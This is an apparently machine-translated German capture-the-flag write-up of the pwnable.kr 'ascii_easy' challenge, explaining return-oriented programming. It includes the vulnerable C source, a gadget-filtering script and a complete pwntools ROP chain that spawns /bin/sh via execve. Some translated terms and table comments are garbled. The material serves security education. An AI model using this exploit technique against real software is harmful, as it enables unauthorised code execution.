<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë®üèø‚Äçüíº ü§ù ü§¶üèº Probleml√∂sung mit pwnable.kr 26 - ascii_easy. Wir besch√§ftigen uns ein f√ºr alle Mal mit ROP-Ger√§ten von Grund auf üêµ üçà üèí</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In diesem Artikel werden wir die 26. Aufgabe von der Website pwnable.kr l√∂sen und verstehen, was ROP ist, wie es funktioniert, warum es so gef√§hrlich ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Probleml√∂sung mit pwnable.kr 26 - ascii_easy. Wir besch√§ftigen uns ein f√ºr alle Mal mit ROP-Ger√§ten von Grund auf</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/479184/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/al/py/ef/alpyefagnx81cc2xc1ncjqs8lus.png" alt="Bild"></div><br>  In diesem Artikel werden wir die 26. Aufgabe von der Website <a href="https://pwnable.kr/index.php">pwnable.kr l√∂sen</a> und verstehen, was ROP ist, wie es funktioniert, warum es so gef√§hrlich ist, und eine ROP-Kette mit zus√§tzlichen komplizierenden K√§mpfern zusammenstellen. <br><br><div class="spoiler">  <b class="spoiler_title">Organisatorische Informationen</b> <div class="spoiler_text">  Speziell f√ºr diejenigen, die etwas Neues lernen und sich in einem der Bereiche Informations- und Computersicherheit weiterentwickeln m√∂chten, werde ich folgende Kategorien beschreiben und besprechen: <br><br><ul><li>  PWN; </li><li>  Kryptographie (Crypto); </li><li>  Netzwerktechnologien (Netzwerk); </li><li>  Reverse (Reverse Engineering); </li><li>  Steganographie (Stegano); </li><li>  Suche und Ausnutzung von WEB-Schwachstellen. </li></ul><br>  Dar√ºber hinaus werde ich meine Erfahrungen in den Bereichen Computerforensik, Analyse von Malware und Firmware, Angriffe auf drahtlose Netzwerke und lokale Netzwerke, Durchf√ºhrung von Pentests und Schreiben von Exploits teilen. <br><a name="habracut"></a><br>  Damit Sie sich √ºber neue Artikel, Software und andere Informationen informieren k√∂nnen, habe ich <a href="https://t.me/RalfHackerChannel">in Telegram</a> einen <a href="https://t.me/RalfHackerChannel">Channel</a> und eine <a href="https://t.me/RalfHackerPublicChat">Gruppe erstellt, um alle Fragen</a> im Bereich ICD <a href="https://t.me/RalfHackerPublicChat">zu diskutieren</a> .  Auch ich werde Ihre pers√∂nlichen W√ºnsche, Fragen, Anregungen und Empfehlungen <a href="https://t.me/hackerralf8">pers√∂nlich</a> ber√ºcksichtigen <a href="https://t.me/hackerralf8">und auf alle antworten</a> . <br><br>  Alle Informationen werden nur zu Bildungszwecken bereitgestellt.  Der Autor dieses Dokuments √ºbernimmt keine Verantwortung f√ºr Sch√§den, die jemandem durch die Verwendung von Kenntnissen und Methoden entstehen, die er durch das Studium dieses Dokuments erlangt hat. <br></div></div><br><h2>  Ascii_easy Jobl√∂sung </h2><br>  Wir fahren mit dem zweiten Abschnitt fort.  Ich werde gleich sagen, dass es schwieriger ist als das erste, aber dieses Mal liefern sie uns den Quellcode des Programms.  Vergessen Sie nicht die Diskussion hier (https://t.me/RalfHackerPublicChat) und hier (https://t.me/RalfHackerChannel).  Fangen wir an. <br><br>  Klicken Sie auf das Symbol "ascii_easy".  Wir erhalten die Adresse und den Port f√ºr die Verbindung √ºber SSH. <br><br><img src="https://habrastorage.org/webt/ge/53/jl/ge53jl_ddkjj9zad8gup5yqo0h8.png" alt="Bild"><br><br>  Wir sind √ºber SSH verbunden und sehen das Flag, das Programm, den Quellcode und die libc-Bibliothek. <br><br><img src="https://habrastorage.org/webt/or/ub/6l/orub6lhkczfsetqsuw2x9j2asey.png" alt="Bild"><br><br>  Sehen wir uns den Quellcode an. <br><br><pre><code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;sys/mman.h&gt; #include &lt;sys/stat.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;fcntl.h&gt; #define BASE ((void*)0x5555e000) int is_ascii(int c){ if(c&gt;=0x20 &amp;&amp; c&lt;=0x7f) return 1; return 0; } void vuln(char* p){ char buf[20]; strcpy(buf, p); } void main(int argc, char* argv[]){ if(argc!=2){ printf("usage: ascii_easy [ascii input]\n"); return; } size_t len_file; struct stat st; int fd = open("/home/ascii_easy/libc-2.15.so", O_RDONLY); if( fstat(fd,&amp;st) &lt; 0){ printf("open error. tell admin!\n"); return; } len_file = st.st_size; if (mmap(BASE, len_file, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE, fd, 0) != BASE){ printf("mmap error!. tell admin\n"); return; } int i; for(i=0; i&lt;strlen(argv[1]); i++){ if( !is_ascii(argv[1][i]) ){ printf("you have non-ascii byte!\n"); return; } } printf("triggering bug...\n"); vuln(argv[1]); }</span></span></span></span></code> </pre> <br>  Sortieren wir es in Bl√∂cke.  Das Programm nimmt einen String als Argument. <br><br><img src="https://habrastorage.org/webt/ak/t1/pl/akt1plapzckoytih2axlahov1xu.png" alt="Bild"><br><br>  In diesem Fall sollte die Zeichenfolge nur aus ASCII-Zeichen bestehen. <br><br><img src="https://habrastorage.org/webt/-u/7_/-e/-u7_-ecejem29fcuzepraryilqc.png" alt="Bild"><br><br>  Ein Speicherbereich mit einer bekannten Basisadresse und Lese-, Schreib- und Ausf√ºhrungsberechtigungen wird ebenfalls zugewiesen.  Die libc-Bibliothek wird in diesen Bereich gestellt. <br><br><img src="https://habrastorage.org/webt/gs/yz/rn/gsyzrnqcx2agjccuzocxnf6sl8a.png" alt="Bild"><br><br>  Zus√§tzlich zu allem hat das Programm eine anf√§llige Funktion. <br><br><img src="https://habrastorage.org/webt/m0/kn/fs/m0knfsj8iqwfp8vxdmpmrxymtle.png" alt="Bild"><br><br>  Wenn Sie das Programm √ºberpr√ºfen, k√∂nnen Sie au√üerdem sicherstellen, dass es einen nicht ausf√ºhrbaren Stapel enth√§lt (Parameter NX).  Wir werden durch die Erstellung der ROP entscheiden. <br><br><img src="https://habrastorage.org/webt/_i/av/t_/_iavt_ge6nd7yxqorv_1mzjwu2w.png" alt="Bild"><br><br>  Kopieren wir die Bibliothek zu uns. <br><br><pre> <code class="bash hljs">scp -P2222 ascii_easy@pwnable.kr:/home/ascii_easy/libc-2.15.so /root/</code> </pre> <br>  Nun m√ºssen Sie die ROP-Kette zusammenbauen.  Verwenden Sie dazu das <a href="https://github.com/JonathanSalwan/ROPgadget">ROP-Gadget-</a> Tool. <br><br><pre> <code class="bash hljs">ROPgadget --binary libc-2.15.so &gt; gadgets.txt</code> </pre> <br>  In der Datei gadgets.txt haben wir alle m√∂glichen ROP-Ketten (Beispiel 10 der ersten ist unten dargestellt). <br><br><img src="https://habrastorage.org/webt/ao/ep/ms/aoepmsdk0saqpol7ekuvr6ks9y4.png" alt="Bild"><br><br>  Das Problem ist, dass wir nur solche ausw√§hlen m√ºssen, die aus ASCII-Zeichen bestehen.  Dazu schreiben wir einen einfachen Filter, der nur die Adressen zur√ºckl√§sst, von denen jedes Byte zum Intervall von 0x20 bis einschlie√ülich 0x7f geh√∂rt. <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">addr_check</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(addr)</span></span></span><span class="hljs-function">:</span></span> ret = <span class="hljs-keyword"><span class="hljs-keyword">True</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-number"><span class="hljs-number">8</span></span>,<span class="hljs-number"><span class="hljs-number">2</span></span>): <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> int(addr[i:i+<span class="hljs-number"><span class="hljs-number">2</span></span>], <span class="hljs-number"><span class="hljs-number">16</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0x20</span></span>, <span class="hljs-number"><span class="hljs-number">0x80</span></span>): ret = <span class="hljs-keyword"><span class="hljs-keyword">False</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> ret f = open(<span class="hljs-string"><span class="hljs-string">'gadgets.txt'</span></span>, <span class="hljs-string"><span class="hljs-string">'rt'</span></span>) old_gadgets = f.read().split(<span class="hljs-string"><span class="hljs-string">'\n'</span></span>)[<span class="hljs-number"><span class="hljs-number">2</span></span>:<span class="hljs-number"><span class="hljs-number">-3</span></span>] f.close() new_gadgets = <span class="hljs-string"><span class="hljs-string">""</span></span> base_addr = <span class="hljs-number"><span class="hljs-number">0x5555e000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> gadget <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> old_gadgets: addr = base_addr + int(gadget.split(<span class="hljs-string"><span class="hljs-string">' : '</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>], <span class="hljs-number"><span class="hljs-number">16</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> addr_check(hex(addr)[<span class="hljs-number"><span class="hljs-number">2</span></span>:]): new_gadgets += (hex(addr) + <span class="hljs-string"><span class="hljs-string">' :'</span></span> + <span class="hljs-string"><span class="hljs-string">":"</span></span>.join(gadget.split(<span class="hljs-string"><span class="hljs-string">':'</span></span>)[<span class="hljs-number"><span class="hljs-number">1</span></span>:]) + <span class="hljs-string"><span class="hljs-string">'\n'</span></span>) f = open(<span class="hljs-string"><span class="hljs-string">'new_gadgets.txt'</span></span>, <span class="hljs-string"><span class="hljs-string">'wt'</span></span>) f.write(new_gadgets) f.close()</code> </pre> <br>  F√ºhren Sie das Programm aus und erhalten Sie eine Liste der ROP-Gadget-Adressen, die uns zufrieden stellen. <br><br><h2>  Rop-Ger√§te </h2><br>  Viele baten um mehr Details zur renditeorientierten Programmierung.  Ok, lass uns ein Beispiel mit Illustrationen geben.  Angenommen, wir haben eine Puffer√ºberlauf-Sicherheitsanf√§lligkeit und einen nicht ausf√ºhrbaren Stapel. <br><br>  Ein ROP-Gadget ist eine Sammlung von Anweisungen, die mit einer return-Anweisung ret endet.  Gadgets w√§hlen in der Regel aus den Endungen der Funktionen aus.  Nehmen wir als Beispiel einige Funktionen.  W√§hlen Sie in jedem von ihnen das ROP-Gadget (rot hervorgehoben). <br><br><img src="https://habrastorage.org/webt/bi/x9/vg/bix9vgbrwmt_lw3fljdo67ypxay.png" alt="Bild"><br><br><img src="https://habrastorage.org/webt/ca/tt/xv/cattxv09arrtaaxvfgrv7fqluhw.png" alt="Bild"><br><br><img src="https://habrastorage.org/webt/-y/h7/ev/-yh7evjzqvz_nyp857mj0f2iupe.png" alt="Bild"><br><br>  Wir haben also mehrere ROP-Ketten: <br><br><pre> <code class="plaintext hljs">0x000ed7cb: mov eax, edx; pop ebx; pop esi; ret 0x000ed7cd: pop ebx; pop esi; ret 0x000ed7ce: pop esi; ret 0x00033837: pop ebx; ret 0x0010ec1f: add esp, 0x2c; ret</code> </pre> <br>  Nun wollen wir herausfinden, was f√ºr eine Art von ROP-Ketten sind.  Wenn der Puffer √ºberl√§uft, k√∂nnen wir die R√ºcksprungadresse umschreiben.  Angenommen, zu dem Zeitpunkt sollte der Befehl ret in der Zielfunktion ausgef√ºhrt werden, d. H., Am Anfang des Stapels befindet sich eine g√ºltige Adresse. <br><br>  Zum Beispiel m√∂chten wir den folgenden Code ausf√ºhren: <br><br><pre> <code class="plaintext hljs">add esp, 0x2c add esp, 0x2c add esp, 0x2c mov eax, edx pop ebx pop esi ret</code> </pre> <br>  Wir m√ºssen die g√ºltige R√ºcksendeadresse mit den folgenden Adressen umschreiben: <br><br><pre> <code class="plaintext hljs">0x0010ec1f 0x0010ec1f 0x0010ec1f 0x000ed7cb</code> </pre> <br>  Sehen wir uns das folgende Bild an, um zu verstehen, warum dies funktioniert. <br><br><img src="https://habrastorage.org/webt/tm/9y/ym/tm9yymnijh0hzpkujdcc4rky5m0.png" alt="Bild"><br><br>  Anstatt zu einer g√ºltigen Adresse zur√ºckzukehren, gehen wir zur ersten Adresse unserer ROP-Kette.  Nach Ausf√ºhrung des ersten Befehls verschiebt der Befehl ret das Programm zur n√§chsten Adresse auf dem Stapel, dh zum zweiten Befehl.  Der zweite Befehl endet ebenfalls mit ret, wodurch auch der n√§chste Befehl aufgerufen wird, dessen Adresse auf dem Stapel angegeben ist.  Auf diese Weise erreichen wir die Ausf√ºhrung des zuvor kompilierten Codes. <br><br><h2>  ROP-Verkettung f√ºr ascii_easy </h2><br>  Zun√§chst werden wir herausfinden, wie viele Bytes wir zum √úberlaufen des Puffers ben√∂tigen.  F√ºhren Sie das Programm in gdb aus und f√ºhren Sie die Zeile der Eingabe zu. <br><br><img src="https://habrastorage.org/webt/ze/m8/g0/zem8g0mg7gg70r7fc-ajzfgmkoo.png" alt="Bild"><br><br>  Und das Programm st√ºrzt auf die Adresse ‚Äûbbbb‚Äú ab, was bedeutet, dass der Abstand 32 Zeichen betr√§gt. <br><br>  Am bequemsten ist es, die Funktion execve zu verwenden, um ROP zu betreiben.  Die Bequemlichkeit liegt in der √úbergabe von Parametern durch Register.  Lassen Sie uns diese Funktion in der libc-Bibliothek finden.  Dies kann mit GDB erfolgen. <br><br><img src="https://habrastorage.org/webt/y-/sk/ed/y-sked5ft1hnd-jpurjehtehmeu.png" alt="Bild"><br><br>  Wenn wir jedoch die Ladeadresse der Bibliothek im Speicher zur Funktionsadresse hinzuf√ºgen, werden wir feststellen, dass sie die ASCII-Bedingung nicht erf√ºllt. <br><br><img src="https://habrastorage.org/webt/xn/1k/7r/xn1k7ro765zqq7mpgdvdm1wjaho.png" alt="Bild"><br><br>  Es gibt jedoch eine andere M√∂glichkeit, die Funktion aufzurufen.  Dies geschieht durch einen Systemaufruf.  Unter Linux hat jeder Systemaufruf eine eigene Nummer.  Diese Nummer muss sich im EAX-Register befinden, gefolgt von einem int 0x80-Interrupt-Aufruf.  Die komplette Siscall-Tabelle finden Sie <a href="https://syscalls.kernelgrok.com/">hier</a> . <br><br><img src="https://habrastorage.org/webt/m9/8x/ox/m98xoxmmyfcmwdzr5mgm385que0.png" alt="Bild"><br><br>  Somit hat die Ausf√ºhrungsfunktion die Nummer 11, dh der Wert 0xb sollte sich im EAX-Register befinden.  Die Parameter werden √ºber die EBX-Register √ºbertragen - die Adresse am Anfang der Parameterzeile, ECX - die Adresse am Zeiger auf die Parameterzeile und EDX - die Adresse am Zeiger auf die Argumentumgebungsvariablen. <br><br><img src="https://habrastorage.org/webt/1q/zg/zu/1qzgzuc4ceptg18chizshdkvs-y.png" alt="Bild"><br><br>  Wir m√ºssen den String '/ bin / sh' an die Funktion √ºbergeben.  Dazu m√ºssen wir es an die f√ºr die Aufzeichnung zul√§ssige Stelle schreiben und die Adresse des Strings als Parameter √ºbergeben.  Die Zeile muss 4 Zeichen speichern, d.h.  '/ bin' und '// sh', da die Register jeweils 4 Bytes √ºbertragen.  Dazu habe ich folgende Gadgets gefunden: <br><br><pre> <code class="plaintext hljs">0x555f3555 : pop edx ; xor eax, eax ; pop edi ; ret 0x55687b3c : mov dword ptr [edx], edi ; pop esi ; pop edi ; ret</code> </pre><br>  Dieses Gadget: <br><br><ol><li>  Nimm die Adresse zum Schreiben der Zeichenkette vom Stapel und lege sie in das edx-Register, nullifiziert eax. </li><li>  Es nimmt einen Wert vom Stapel und legt ihn in edi ab. </li><li>  Es kopiert den Wert von edi an die Adresse in edx (es schreibt unsere Zeile an die gew√ºnschte Adresse). </li><li>  Es werden zwei weitere Werte vom Stapel genommen. </li></ol><br>  F√ºr den Betrieb m√ºssen daher folgende Werte √ºbergeben werden: <br><br><pre> <code class="plaintext hljs">0x555f3555 ;    memory_addr ;     (edx) 4__ ; 4    (edi) 0x55687b3c ;    4__ ;    (esi) 4__ ;    (edi)</code> </pre> <br>  Anschlie√üend k√∂nnen Sie dieselben Minianwendungen ausf√ºhren, um den zweiten Teil der Zeile zu kopieren.  Es wird nicht schwierig sein, die Adresse zum Schreiben zu finden, da die Bibliothek in einen Speicherbereich geladen ist, auf den zum Lesen, Schreiben und Ausf√ºhren zugegriffen werden kann. <br><br><img src="https://habrastorage.org/webt/yl/3w/pq/yl3wpq0fu8v3zpa52_5ax31tou4.png" alt="Bild"><br><br>  Alle Adressen, die die ASCII-Bedingung erf√ºllen, k√∂nnen dort eingetragen werden.  Ich habe die Adresse 0x55562023 genommen. <br><br>  Jetzt m√ºssen wir unsere Zeile mit einem Nullzeichen beenden.  F√ºr diese Aufgabe verwende ich die folgende Gadgetkette: <br><br><pre> <code class="plaintext hljs">0x555f3555 : pop edx ; xor eax, eax ; pop edi ; ret 0x5560645c : mov dword ptr [edx], eax ; ret</code> </pre> <br>  Dieses Gadget: <br><br><ol><li>  Nimm die Adresse f√ºr den Null-Eintrag vom Stapel und lege sie in das edx-Register, nullifiziere eax. </li><li>  Nimm den Wert vom Stapel. </li><li>  Kopieren Sie den Wert von zeroed eax an die Adresse in edx. </li></ol><br>  F√ºr den Betrieb m√ºssen daher folgende Werte √ºbergeben werden: <br><br><pre> <code class="plaintext hljs">0x555f3555 ;    memory_addr+8 ;    0 -   (edx) 4__ ;    edi 0x5560645c ;   </code> </pre> <br>  So haben wir unsere Zeichenfolge in den Speicher kopiert.  Als n√§chstes m√ºssen Sie die Register ausf√ºllen, um Werte zu √ºbertragen.  Da das in execve aufgerufene Programm "/ bin / sh" keine eigenen Argumente und Umgebungsvariablen hat, √ºbergeben wir ihnen einen Nullzeiger.  In ebx schreiben wir die Adresse in die Zeile und in eax schreiben wir 11 - die Nummer des ausf√ºhrenden Siskols.  Dazu habe ich folgende Gadgets gefunden: <br><br><pre> <code class="plaintext hljs">0x555f3555 : pop edx ; xor eax, eax ; pop edi ; ret 0x556d2a51 : pop ecx ; add al, 0xa ; ret 0x5557734e : pop ebx ; ret 0x556c6864 : inc eax ; ret</code> </pre> <br>  Dieses Gadget: <br><br><ol><li>  Setzt einen Wert aus dem Stapel in edx und macht eax ung√ºltig. </li><li>  Verschieben Sie den Wert vom Stapel nach edi. </li><li>  Verschieben Sie den Wert vom Stapel nach ecx und addieren Sie ihn zu null eax 10. </li><li>  Verschieben Sie den Wert vom Stack zum ebx. </li><li>  Erh√∂hen Sie eax von 10 auf 11. </li></ol><br>  F√ºr den Betrieb m√ºssen daher folgende Werte √ºbergeben werden: <br><br><pre> <code class="plaintext hljs">0x555f3555 ;    memory_addr+8 ;  null (edx) 4__ ;    edi 0x556d2a51 ;    memory_addr+8 ;  null (ecx) 0x5557734e ;    memory_addr ;  -(ebx) 0x556c6864 ;   </code> </pre> <br>  Und wir beenden unsere ROP-Kette mit einer Ausnahme. <br><br><pre> <code class="plaintext hljs">0x55667176 : inc esi ; int 0x80</code> </pre> <br>  Nachfolgend finden Sie eine abgek√ºrzte und allgemeine Aufzeichnung des oben Gesagten. <br><br><img src="https://habrastorage.org/webt/5g/ct/yo/5gctyor-rphkhergybnitmkuw9c.png" alt="Bild"><br><br>  Und der Code, der die Nutzlast bildet. <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * payload = <span class="hljs-string"><span class="hljs-string">"a"</span></span>*<span class="hljs-number"><span class="hljs-number">32</span></span> pop_edx = <span class="hljs-number"><span class="hljs-number">0x555f3555</span></span> memory_addr = <span class="hljs-number"><span class="hljs-number">0x55562023</span></span> mov_edx_edi = <span class="hljs-number"><span class="hljs-number">0x55687b3c</span></span> mov_edx_eax = <span class="hljs-number"><span class="hljs-number">0x5560645c</span></span> pop_ecx = <span class="hljs-number"><span class="hljs-number">0x556d2a51</span></span> pop_ebx = <span class="hljs-number"><span class="hljs-number">0x5557734e</span></span> inc_eax = <span class="hljs-number"><span class="hljs-number">0x556c6864</span></span> int_80 = <span class="hljs-number"><span class="hljs-number">0x55667176</span></span> payload += p32(pop_edx) payload += p32(memory_addr) payload += <span class="hljs-string"><span class="hljs-string">'/bin'</span></span> payload += p32(mov_edx_edi) payload += <span class="hljs-string"><span class="hljs-string">'aaaaaaaa'</span></span> payload += p32(pop_edx) payload += p32(memory_addr + <span class="hljs-number"><span class="hljs-number">4</span></span>) payload += <span class="hljs-string"><span class="hljs-string">'//sh'</span></span> payload += p32(mov_edx_edi) payload += <span class="hljs-string"><span class="hljs-string">'aaaaaaaa'</span></span> payload += p32(pop_edx) payload += p32(memory_addr + <span class="hljs-number"><span class="hljs-number">8</span></span>) payload += <span class="hljs-string"><span class="hljs-string">'aaaa'</span></span> payload += p32(mov_edx_eax) payload += p32(pop_edx) payload += p32(memory_addr + <span class="hljs-number"><span class="hljs-number">8</span></span>) payload += <span class="hljs-string"><span class="hljs-string">'aaaa'</span></span> payload += p32(pop_ecx) payload += p32(memory_addr + <span class="hljs-number"><span class="hljs-number">8</span></span>) payload += p32(pop_ebx) payload += p32(memory_addr) payload += p32(inc_eax) payload += p32(int_80) print(payload)</code> </pre> <br><img src="https://habrastorage.org/webt/gm/tf/kn/gmtfknekpcxwqulhsch3j2usf_s.png" alt="Bild"><br><br><img src="https://habrastorage.org/webt/u9/am/mf/u9ammf98izz1gjtvcntgepqrhlm.png" alt="Bild"><br><br>  Ehrlich gesagt, f√ºr mich war es aus irgendeinem Grund eine der schwierigsten Aufgaben auf dieser Website ... <br><br>  Immer komplizierter ... Sie k√∂nnen sich uns auf <a href="https://t.me/RalfHackerChannel">Telegramm anschlie√üen</a> .  Bauen wir eine Community auf, in der es Menschen geben wird, die sich in vielen Bereichen der IT auskennen. Dann k√∂nnen wir uns gegenseitig in allen Fragen der IT- und Informationssicherheit helfen. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de479184/">https://habr.com/ru/post/de479184/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de479170/index.html">Wochenendlesung: Audio Digest von Streaming-Diensten und der Musikindustrie</a></li>
<li><a href="../de479176/index.html">Die Modder haben 15 Jahre damit verbracht, die Ritter der Alten Republik 2 zu reparieren</a></li>
<li><a href="../de479178/index.html">Deanonymisierung elliptischer Datensatztransaktionen</a></li>
<li><a href="../de479180/index.html">Erstellung eines Discord-bot auf .NET Core mit Bereitstellung auf einem VPS-Server</a></li>
<li><a href="../de479182/index.html">Das √úben der Vorbereitung von Fremdw√∂rtern mit Sprachausgabe zum Auswendiglernen im Anki-Programm</a></li>
<li><a href="../de479186/index.html">√úber die Struktur des Parallel-Computing oder die Argumente gegen den "Go" -Operator</a></li>
<li><a href="../de479188/index.html">Die Summe aller nat√ºrlichen Zahlen: 1 + 2 + 3 + 4 + .... Teil 2</a></li>
<li><a href="../de479192/index.html">Steroid Hypervisor: FreeBSD + ZFS + cbsd</a></li>
<li><a href="../de479196/index.html">Die meisten Supercomputer laufen unter Linux - diskutieren Sie die Situation</a></li>
<li><a href="../de479200/index.html">Fraktale Bildkomprimierung</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>